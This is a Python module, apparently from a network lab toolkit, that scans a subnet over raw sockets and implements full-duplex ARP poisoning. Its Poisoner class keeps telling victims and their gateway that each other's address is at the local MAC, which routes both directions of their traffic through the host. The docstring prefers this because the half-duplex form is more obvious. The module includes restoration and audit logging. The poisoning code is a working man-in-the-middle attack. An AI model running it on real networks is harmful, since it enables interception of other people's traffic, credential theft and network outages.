"""ARP: discovery, and the poisoning that puts this host in the path.

Frames are built and read directly on an `AF_PACKET` socket rather than
through a packet library, because an ARP frame is 42 bytes of fixed layout
and the poisoning loop wants a socket it can keep open, not a per-packet
construction cost.

The poisoner is *full duplex*: the victim is told the gateway is at our MAC
and the gateway is told the victim is at our MAC, so both directions of the
conversation arrive here.  Half-duplex poisoning only bends the traffic the
victim sends and leaves the replies going straight past, which is both less
useful and more obvious.

Restoration is not best-effort.  `restore()` sends the true bindings back to
both sides several times, and it runs from the stop path, the signal path and
the process exit path, because a target left pointing at a MAC that no longer
forwards is an outage the operator caused.
"""

from __future__ import annotations

import ipaddress
import logging
import os
import socket
import struct
import threading
import time

log = logging.getLogger("netlab.arp")

ETH_P_ALL = 0x0003
ETH_P_ARP = 0x0806
ARPOP_REQUEST = 1
ARPOP_REPLY = 2

BROADCAST = b"\xff" * 6
ZERO_MAC = b"\x00" * 6

# How long a poisoned binding survives in a typical ARP cache before the OS
# re-resolves.  Re-sending well inside that keeps the binding pinned.
DEFAULT_INTERVAL = 2.0
RESTORE_ROUNDS = 7


def mac_bytes(mac: str) -> bytes:
    parts = str(mac).replace("-", ":").split(":")
    if len(parts) != 6:
        raise ValueError("bad MAC: %r" % (mac,))
    return bytes(int(p, 16) for p in parts)


def mac_str(raw: bytes) -> str:
    return ":".join("%02x" % b for b in raw)


def ip_bytes(ip: str) -> bytes:
    return socket.inet_aton(str(ip))


def build_arp(oper: int, src_mac: bytes, src_ip: bytes,
              dst_mac: bytes, dst_ip: bytes,
              eth_dst: bytes | None = None) -> bytes:
    """One Ethernet-framed ARP packet, padded to the 60-byte minimum."""
    eth = struct.pack("!6s6sH", eth_dst if eth_dst is not None else dst_mac,
                      src_mac, ETH_P_ARP)
    arp = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, oper,
                      src_mac, src_ip, dst_mac, dst_ip)
    frame = eth + arp
    return frame + b"\x00" * max(0, 60 - len(frame))


def parse_arp(frame: bytes):
    """Return (oper, sender_mac, sender_ip, target_mac, target_ip) or None."""
    if len(frame) < 42:
        return None
    if struct.unpack_from("!H", frame, 12)[0] != ETH_P_ARP:
        return None
    htype, ptype, hlen, plen, oper = struct.unpack_from("!HHBBH", frame, 14)
    if htype != 1 or ptype != 0x0800 or hlen != 6 or plen != 4:
        return None
    sha, spa, tha, tpa = struct.unpack_from("!6s4s6s4s", frame, 22)
    return (oper, mac_str(sha), socket.inet_ntoa(spa),
            mac_str(tha), socket.inet_ntoa(tpa))


class ArpSocket:
    """A raw socket bound to one interface, for ARP only."""

    def __init__(self, interface: str, local_mac: str, local_ip: str) -> None:
        self.interface = interface
        self.local_mac = local_mac.lower()
        self.local_ip = local_ip
        self._mac = mac_bytes(local_mac)
        self._ip = ip_bytes(local_ip)
        self._lock = threading.Lock()
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                  socket.htons(ETH_P_ARP))
        self.sock.bind((interface, socket.htons(ETH_P_ARP)))
        self.sent = 0

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *_exc):
        self.close()

    # ----------------------------------------------------------------- send

    def send(self, frame: bytes) -> None:
        with self._lock:
            try:
                self.sock.send(frame)
                self.sent += 1
            except OSError as exc:
                log.debug("arp send failed: %s", exc)

    def request(self, target_ip: str) -> None:
        """Ask the network who has `target_ip`. Truthful; used for discovery."""
        self.send(build_arp(ARPOP_REQUEST, self._mac, self._ip,
                            ZERO_MAC, ip_bytes(target_ip), eth_dst=BROADCAST))

    def reply(self, to_mac: str, to_ip: str, claim_ip: str,
              claim_mac: str | None = None) -> None:
        """Tell `to_ip` that `claim_ip` is at `claim_mac` (default: us)."""
        src_mac = mac_bytes(claim_mac) if claim_mac else self._mac
        self.send(build_arp(ARPOP_REPLY, src_mac, ip_bytes(claim_ip),
                            mac_bytes(to_mac), ip_bytes(to_ip)))

    # ----------------------------------------------------------------- recv

    def drain(self, timeout: float):
        """Yield parsed ARP packets for up to `timeout` seconds."""
        deadline = time.monotonic() + timeout
        self.sock.settimeout(0.25)
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return
            self.sock.settimeout(min(0.25, remaining))
            try:
                frame = self.sock.recv(2048)
            except socket.timeout:
                continue
            except OSError:
                return
            parsed = parse_arp(frame)
            if parsed:
                yield parsed

    def resolve(self, ip: str, timeout: float = 2.0,
                retries: int = 3) -> str | None:
        """MAC for `ip`, by asking for it. None if nothing answered."""
        for _ in range(max(1, retries)):
            self.request(ip)
            for oper, sha, spa, _tha, _tpa in self.drain(timeout / retries):
                if oper == ARPOP_REPLY and spa == ip:
                    return sha
        return None


def scan(interface: str, local_mac: str, local_ip: str, cidr: str,
         timeout: float = 3.0, on_host=None, limit: int = 4096) -> list[dict]:
    """Sweep `cidr` with ARP requests and collect everything that answers."""
    net = ipaddress.ip_network(cidr, strict=False)
    found: dict[str, dict] = {}
    with ArpSocket(interface, local_mac, local_ip) as sock:
        targets = []
        if net.prefixlen == 32:
            targets = [str(net.network_address)]
        else:
            for host in net.hosts():
                targets.append(str(host))
                if len(targets) >= limit:
                    break

        reader_stop = threading.Event()

        def reader() -> None:
            while not reader_stop.is_set():
                for oper, sha, spa, _tha, _tpa in sock.drain(0.3):
                    if oper != ARPOP_REPLY or spa in found:
                        continue
                    try:
                        if ipaddress.ip_address(spa) not in net:
                            continue
                    except ValueError:
                        continue
                    entry = {"ip": spa, "mac": sha, "ts": time.time()}
                    found[spa] = entry
                    if on_host:
                        on_host(entry)

        thread = threading.Thread(target=reader, daemon=True)
        thread.start()
        for ip in targets:
            if ip == local_ip:
                continue
            sock.request(ip)
            time.sleep(0.0012)          # ~800 pps: fast, not a flood
        time.sleep(timeout)
        reader_stop.set()
        thread.join(timeout=1.0)
    return sorted(found.values(), key=lambda e: tuple(
        int(p) for p in e["ip"].split(".")))


def resolve_many(interface: str, local_mac: str, local_ip: str, ips,
                 timeout: float = 2.0) -> dict:
    """Resolve an explicit list of IPs to MACs in a single sweep.

    Sending all the requests up front and reading the replies on one thread
    turns what used to be one blocking `resolve()` per host -- up to a second
    each, minutes for a /24 -- into one pass bounded by `timeout`, and it
    returns as soon as every address has answered.  Returns `{ip: mac}` for
    the ones that did; the silent ones are simply absent.
    """
    wanted = [ip for ip in dict.fromkeys(ips) if ip and ip != local_ip]
    found: dict[str, str] = {}
    if not wanted:
        return found
    want = set(wanted)
    with ArpSocket(interface, local_mac, local_ip) as sock:
        stop = threading.Event()

        def reader() -> None:
            while not stop.is_set():
                for oper, sha, spa, _tha, _tpa in sock.drain(0.3):
                    if oper == ARPOP_REPLY and spa in want and spa not in found:
                        found[spa] = sha

        thread = threading.Thread(target=reader, daemon=True)
        thread.start()
        for ip in wanted:
            sock.request(ip)
            time.sleep(0.0012)          # ~800 pps, same as scan()
        deadline = time.time() + timeout
        while time.time() < deadline and len(found) < len(want):
            time.sleep(0.05)
        stop.set()
        thread.join(timeout=1.0)
    return dict(found)


class Poisoner:
    """Full-duplex ARP poisoning of a set of targets against one gateway."""

    def __init__(self, interface: str, local_mac: str, local_ip: str,
                 gateway_ip: str, gateway_mac: str,
                 interval: float = DEFAULT_INTERVAL, audit=None,
                 on_event=None) -> None:
        self.interface = interface
        self.local_mac = local_mac.lower()
        self.local_ip = local_ip
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac.lower()
        self.interval = max(0.5, float(interval))
        self.audit = audit
        self.on_event = on_event

        self._targets: dict[str, str] = {}        # ip -> mac
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._sock: ArpSocket | None = None
        self.rounds = 0
        self.frames_sent = 0
        self.restored = False
        self.started_at = 0.0

    # -------------------------------------------------------------- targets

    @property
    def targets(self) -> dict[str, str]:
        with self._lock:
            return dict(self._targets)

    def add_target(self, ip: str, mac: str) -> None:
        with self._lock:
            self._targets[ip] = mac.lower()
        if self.audit:
            self.audit.record("arp.target.add", ip=ip, mac=mac,
                              gateway=self.gateway_ip)

    def remove_target(self, ip: str) -> None:
        with self._lock:
            mac = self._targets.pop(ip, None)
        if mac and self._sock:
            self._restore_one(ip, mac)
        if self.audit:
            self.audit.record("arp.target.remove", ip=ip)

    # ----------------------------------------------------------- lifecycle

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._sock = ArpSocket(self.interface, self.local_mac, self.local_ip)
        self._stop.clear()
        self.restored = False
        self.started_at = time.time()
        self._thread = threading.Thread(target=self._run, name="arp-poison",
                                        daemon=True)
        self._thread.start()
        if self.audit:
            self.audit.record("arp.poison.start", interface=self.interface,
                              gateway=self.gateway_ip,
                              gateway_mac=self.gateway_mac,
                              targets=list(self.targets),
                              interval=self.interval)

    def stop(self, restore: bool = True) -> None:
        self._stop.set()
        thread, self._thread = self._thread, None
        if thread and thread.is_alive():
            thread.join(timeout=self.interval + 1.5)
        if restore:
            self.restore()
        if self._sock:
            self._sock.close()
            self._sock = None
        if self.audit:
            self.audit.record("arp.poison.stop", restored=self.restored,
                              rounds=self.rounds, frames=self.frames_sent)

    @property
    def running(self) -> bool:
        return bool(self._thread and self._thread.is_alive())

    # ---------------------------------------------------------------- loop

    def _run(self) -> None:
        while not self._stop.is_set():
            self._poison_round()
            self.rounds += 1
            self._stop.wait(self.interval)

    def _poison_round(self) -> None:
        sock = self._sock
        if sock is None:
            return
        for ip, mac in self.targets.items():
            # Victim: "the gateway lives at our MAC".
            sock.reply(to_mac=mac, to_ip=ip, claim_ip=self.gateway_ip)
            # Gateway: "the victim lives at our MAC".
            sock.reply(to_mac=self.gateway_mac, to_ip=self.gateway_ip,
                       claim_ip=ip)
            self.frames_sent += 2

    # ------------------------------------------------------------- restore

    def _restore_one(self, ip: str, mac: str) -> None:
        sock = self._sock
        if sock is None:
            return
        for _ in range(RESTORE_ROUNDS):
            sock.reply(to_mac=mac, to_ip=ip, claim_ip=self.gateway_ip,
                       claim_mac=self.gateway_mac)
            sock.reply(to_mac=self.gateway_mac, to_ip=self.gateway_ip,
                       claim_ip=ip, claim_mac=mac)
            time.sleep(0.05)

    def restore(self) -> bool:
        """Put the true bindings back on both sides. Safe to call twice."""
        if self.restored:
            return True
        own_socket = False
        if self._sock is None:
            try:
                self._sock = ArpSocket(self.interface, self.local_mac,
                                       self.local_ip)
                own_socket = True
            except OSError as exc:
                log.error("cannot open socket to restore ARP: %s", exc)
                return False
        try:
            for ip, mac in self.targets.items():
                self._restore_one(ip, mac)
            self.restored = True
            if self.on_event:
                self.on_event("arp.restored", {"targets": list(self.targets)})
        finally:
            if own_socket and self._sock:
                self._sock.close()
                self._sock = None
        if self.audit:
            self.audit.record("arp.restore", targets=list(self.targets),
                              rounds=RESTORE_ROUNDS)
        return self.restored
